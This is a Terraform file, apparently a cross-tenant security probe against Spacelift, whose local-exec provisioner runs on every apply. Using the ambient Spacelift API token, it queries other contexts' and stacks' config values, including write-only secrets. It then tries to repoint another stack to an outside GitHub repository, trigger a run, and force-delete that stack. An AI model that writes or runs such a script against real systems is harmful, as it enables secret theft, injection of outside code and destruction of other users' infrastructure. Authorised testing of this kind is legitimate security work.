terraform {
  required_providers {
    null = {
      source  = "hashicorp/null"
      version = "~> 3.2"
    }
  }
}

resource "null_resource" "xsec_probe" {
  triggers = { nonce = timestamp() }

  provisioner "local-exec" {
    command = <<-EOT
      set +e
      echo "=== P5 START ==="
      EP="$TF_VAR_spacelift_graphql_endpoint"
      TOK="$SPACELIFT_API_TOKEN"
      R() {
        echo "--- Q: $1"
        curl -s -m 25 -H "Content-Type: application/json" -H "Authorization: Bearer $TOK" -d "$1" "$EP" | head -c 1400
        echo
      }
      Q1='{ "query": "{ context(id: \\"xsec-a-ctx\\"){ id config { id type value writeOnly } } }" }'
      Q2='{ "query": "{ context(id: \\"auni-xsec-078730\\"){ id config { id type value writeOnly } } }" }'
      Q3='{ "query": "{ stack(id: \\"xsec-stack\\"){ id config { id type value writeOnly } } }" }'
      Q4='{ "query": "{ searchContexts(input:{}){ edges{ node{ id } } } }" }'
      Q5='{ "query": "{ stack(id: \\"xsec-stack\\"){ id name labels } }" }'
      R "$Q1"; R "$Q2"; R "$Q3"; R "$Q4"; R "$Q5"
      echo "=== P5 mutation attempts (other stack) ==="
      M1='{ "query": "mutation { stackUpdate(id: \\"xsec-stack\\", input: { name: \\"xsec-stack\\", branch: \\"main\\", repository: \\"xsec-runner-probe\\", repositoryURL: \\"https://github.com/0xZec/xsec-runner-probe.git\\" }) { id } }" }'
      M2='{ "query": "mutation { runTrigger(stack: \\"xsec-stack\\", runType: TRACKED) { id } }" }'
      M3='{ "query": "mutation { stackDelete(id: \\"xsec-stack\\", force: true) { id } }" }'
      for M in "$M1" "$M2" "$M3"; do
        echo "--- M ---"
        curl -s -m 25 -H "Content-Type: application/json" -H "Authorization: Bearer $TOK" -d "$M" "$EP" | head -c 600
        echo
      done
      echo "=== P5 END ==="
    EOT
  }
}